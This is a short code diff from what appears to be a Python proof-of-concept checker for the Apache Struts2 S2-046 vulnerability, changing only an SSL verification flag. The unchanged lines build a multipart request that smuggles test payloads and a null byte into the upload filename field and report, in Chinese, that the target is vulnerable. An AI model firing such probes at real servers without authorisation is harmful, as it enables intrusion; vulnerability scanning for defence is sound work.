@@ -35,7 +35,7 @@ def poc(url, **kwargs):
     try:
         for test in poc_goop:
             data_046 = '--' + boundary_046 + "\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"" + test + "\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--" + boundary_046 + "--"
-            req = requests.post(url, headers=headers_046, data=data_046, timeout=timeout, verify=False, )
+            req = requests.post(url, headers=headers_046, data=data_046, timeout=timeout, verify=True)
             result = "目标存在 Struts2-046, check url: %s" % url
             for c in check:
                 if str(c) in req.text:
